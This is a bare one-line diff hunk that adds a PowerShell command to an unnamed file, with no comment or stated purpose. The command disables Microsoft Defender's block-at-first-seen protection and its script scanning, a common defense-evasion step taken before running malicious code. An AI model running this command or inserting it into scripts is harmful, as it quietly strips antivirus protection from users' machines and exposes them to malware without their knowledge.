@@ -1,0 +1,1 @@
+Set-MpPreference -DisableBlockAtFirstSeen 1; Set-MpPreference -DisableScriptScanning 1
